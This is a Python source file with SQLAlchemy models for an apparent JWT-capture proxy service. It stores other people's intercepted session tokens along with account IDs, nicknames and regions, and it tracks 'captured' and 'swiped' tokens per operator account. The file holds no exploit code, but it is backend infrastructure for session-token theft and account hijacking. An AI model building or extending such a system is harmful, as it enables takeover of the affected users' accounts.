from flask_sqlalchemy import SQLAlchemy
from datetime import datetime
import bcrypt
import secrets
import string

db = SQLAlchemy()

def generate_api_key():
    alphabet = string.ascii_letters + string.digits
    return 'exu_' + ''.join(secrets.choice(alphabet) for _ in range(32))

class User(db.Model):
    __tablename__ = 'users'
    
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    email = db.Column(db.String(120), unique=True, nullable=False)
    password_hash = db.Column(db.String(200), nullable=False)
    api_key = db.Column(db.String(100), unique=True, nullable=False, default=generate_api_key)
    role = db.Column(db.String(20), default='user')
    is_active = db.Column(db.Boolean, default=True)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    last_login = db.Column(db.DateTime)
    jwts_captured = db.Column(db.Integer, default=0)
    jwts_swiped = db.Column(db.Integer, default=0)
    swipe_jwt = db.Column(db.Text, nullable=True)
    
    captured_jwts = db.relationship('CapturedJWT', backref='user', lazy=True, cascade='all, delete-orphan')
    proxy_logs = db.relationship('ProxyLog', backref='user', lazy=True, cascade='all, delete-orphan')
    
    def set_password(self, password):
        self.password_hash = bcrypt.hashpw(password.encode('utf-8'), bcrypt.gensalt()).decode('utf-8')
    
    def check_password(self, password):
        return bcrypt.checkpw(password.encode('utf-8'), self.password_hash.encode('utf-8'))
    
    def to_dict(self, include_sensitive=False):
        data = {
            'id': self.id,
            'username': self.username,
            'email': self.email,
            'role': self.role,
            'is_active': self.is_active,
            'created_at': self.created_at.isoformat() if self.created_at else None,
            'last_login': self.last_login.isoformat() if self.last_login else None,
            'jwts_captured': self.jwts_captured,
            'jwts_swiped': self.jwts_swiped,
            'has_swipe_jwt': bool(self.swipe_jwt)
        }
        if include_sensitive:
            data['api_key'] = self.api_key
        return data

class CapturedJWT(db.Model):
    __tablename__ = 'captured_jwts'
    
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('users.id'), nullable=False)
    jwt_token = db.Column(db.Text, nullable=False)
    source = db.Column(db.String(50))
    account_id = db.Column(db.String(100))
    nickname = db.Column(db.String(100))
    region = db.Column(db.String(20))
    country = db.Column(db.String(20))
    expiry = db.Column(db.DateTime)
    captured_at = db.Column(db.DateTime, default=datetime.utcnow)
    was_swiped = db.Column(db.Boolean, default=False)
    original_token = db.Column(db.Text, nullable=True)
    
    def to_dict(self):
        return {
            'id': self.id,
            'jwt_token': self.jwt_token[:50] + '...' if self.jwt_token else None,
            'full_jwt': self.jwt_token,
            'source': self.source,
            'account_id': self.account_id,
            'nickname': self.nickname,
            'region': self.region,
            'country': self.country,
            'expiry': self.expiry.isoformat() if self.expiry else None,
            'captured_at': self.captured_at.isoformat() if self.captured_at else None,
            'was_swiped': self.was_swiped
        }

class ProxyLog(db.Model):
    __tablename__ = 'proxy_logs'
    
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('users.id'), nullable=True)
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)
    method = db.Column(db.String(10))
    url = db.Column(db.Text)
    action = db.Column(db.String(50))
    ip_address = db.Column(db.String(50))
    details = db.Column(db.Text)

class SystemLog(db.Model):
    __tablename__ = 'system_logs'
    
    id = db.Column(db.Integer, primary_key=True)
    admin_id = db.Column(db.Integer, db.ForeignKey('users.id'), nullable=True)
    action = db.Column(db.Text)
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)
    ip_address = db.Column(db.String(50))
    
    admin = db.relationship('User', foreign_keys=[admin_id])


def init_db(app):
    """Initialize database with default admin user from .env"""
    with app.app_context():
        db.create_all()
        
        from config import Config
        
        admin = User.query.filter_by(username=Config.ADMIN_USERNAME).first()
        if not admin:
            admin = User(
                username=Config.ADMIN_USERNAME,
                email='admin@exucoder.com',
                role='admin'
            )
            admin.set_password(Config.ADMIN_PASSWORD)
            db.session.add(admin)
            db.session.commit()
            print(f"[+] Created admin user from .env")